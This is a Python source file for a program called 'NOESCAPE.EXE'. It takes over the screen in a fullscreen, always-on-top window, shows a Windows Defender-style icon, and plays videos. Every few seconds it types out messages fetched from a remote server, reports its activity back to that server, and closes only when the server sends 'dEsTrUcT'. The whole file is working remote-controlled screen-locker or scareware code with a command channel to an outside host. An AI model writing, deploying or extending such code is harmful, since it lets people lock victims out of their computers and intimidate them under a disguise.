import tkinter as tk
import time
import cv2
from PIL import Image, ImageTk
import threading
import requests
import os
import sys
say_msg = ''
message_label = None
terminate = False
url = 'https://ms32-sha2.onrender.com/'
user = '<APP>'

def hit(url: str, data=None):
    if not terminate:
        try:
            if data:
                return requests.post(url, json=data)
            return requests.get(url, stream=True)
        except:
            return 'none'

def log(statement, state='SUCESS', terminal=False):
    try:
        statement = f'{state}   {statement}'
        if terminal:
            hit(url + 'terminal', data={'output': statement})
        hit(url + 'output', data={'user': user, 'err': statement})
    except:
        return

def get_message_from_url():
    try:
        response = requests.get('https://ms32-sha2.onrender.com/get-com')
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException:
        log('Failed to fetch message from URL', 'WARN')
        return None
    else:
        pass

def get_video_path(video_name):
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath('.')
    return os.path.join(base_path, video_name)
root = tk.Tk()
root.title("NOESCAPE.EXE")
root.configure(bg='blue')
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.iconbitmap(get_video_path("defender.ico"))

def show_black_screen():
    root.configure(bg='black')
    root.update()
    time.sleep(1)
    root.configure(bg='blue')
    root.update()
    threading.Thread(target=play_video).start()
    root.after(0, create_message_label)

def create_message_label():
    global message_label
    message_label = tk.Label(root, text='', font=('Courier', 28, 'bold'), bg='blue', fg='white', wraplength=1200, justify='left')
    message_label.pack(expand=True)

def clear_screen_with_backspace():
    try:
        current_text = message_label.cget('text').replace('_', '')
        if len(current_text) > 18:
            message_label.config(text='')
            root.update()
            return
        for _ in current_text:
            current_text = current_text[:-1]
            message_label.config(text=current_text + '_')
            root.update()
            time.sleep(0.05)
    except Exception as e:
        log(f'Error in clear_screen_with_backspace: {e}', 'WARN')

def format_message(message, max_line_length=22):
    words = message.split()
    lines = []
    current_line = ''
    for word in words:
        if len(current_line) + len(word) + (1 if current_line else 0) <= max_line_length:
            current_line += (' ' if current_line else '') + word
        else:
            lines.append(current_line)
            current_line = word
    if current_line:
        lines.append(current_line)
    return '\n'.join(lines)

def type_message(message, label, typing_speed):
    formatted = format_message(message)
    current_text = ''
    for char in formatted:
        current_text += char
        label.config(text=current_text + '_')
        root.update()
        time.sleep(typing_speed)
    blink_cursor(label, current_text)
    log(f'Displayed message: {message}')

def blink_cursor(label, message):
    cursor_visible = True
    for _ in range(6):
        label.config(text=message + '_' if cursor_visible else message)
        cursor_visible = not cursor_visible
        root.update()
        time.sleep(0.5)
    if message.replace('_', '') == 'dEsTrUcT':
        close_window()

def play_video():
    video_path = get_video_path('your_video.mp4')
    try:
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            raise ValueError('Could not open video file.')
        canvas_width = root.winfo_width()
        canvas_height = root.winfo_height()
        canvas = tk.Canvas(root, width=canvas_width, height=canvas_height)
        canvas.pack()
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_resized = resize_frame(frame, canvas_width, canvas_height)
            frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img_tk = ImageTk.PhotoImage(image=img)
            canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
            canvas.image = img_tk
            root.update()
        cap.release()
        canvas.destroy()
    except Exception as e:
        log(f'Error playing video: {e}', 'WARN')

def resize_frame(frame, canvas_width, canvas_height):
    height, width = frame.shape[:2]
    aspect_ratio = width / height
    if aspect_ratio > 1:
        new_width = canvas_width
        new_height = int(canvas_width / aspect_ratio)
    else:
        new_height = canvas_height
        new_width = int(canvas_height * aspect_ratio)
    return cv2.resize(frame, (new_width, new_height))

def close_window():
    threading.Thread(target=clean_exit_sequence).start()

def clean_exit_sequence():
    global message_label
    try:
        if message_label:
            clear_screen_with_backspace()
            message_label.destroy()
            message_label = None
            log('Message cleared before destruction.')
    except Exception as e:
        log(f'Error clearing message before destruction: {e}', 'WARN')
    finally:
        time.sleep(0.5)
        play_video_before_close()

def play_video_before_close():
    video_path = get_video_path('your_video_reverse.mp4')
    try:
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            raise ValueError('Could not open closing video file.')
        canvas_width = root.winfo_width()
        canvas_height = root.winfo_height()
        canvas = tk.Canvas(root, width=canvas_width, height=canvas_height)
        canvas.pack()
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_resized = resize_frame(frame, canvas_width, canvas_height)
            frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img_tk = ImageTk.PhotoImage(image=img)
            canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
            canvas.image = img_tk
            root.update()
        cap.release()
        canvas.destroy()
        root.destroy()
    except Exception as e:
        log(f'Error playing closing video: {e}', 'FATAL', terminal=True)

def check_for_new_message():
    global say_msg
    try:
        new_message = get_message_from_url()
        if new_message == 'dEsTrUcT':
            close_window()
        elif new_message and new_message != 'none' and (new_message != say_msg):
            say_msg = new_message
            clear_screen_with_backspace()
            type_message(say_msg, message_label, 0.07)
    except Exception as e:
        log(f'Error checking message: {e}', 'WARN')
    finally:
        root.after(5000, check_for_new_message)
root.after(0, show_black_screen)
root.after(0, check_for_new_message)
root.mainloop()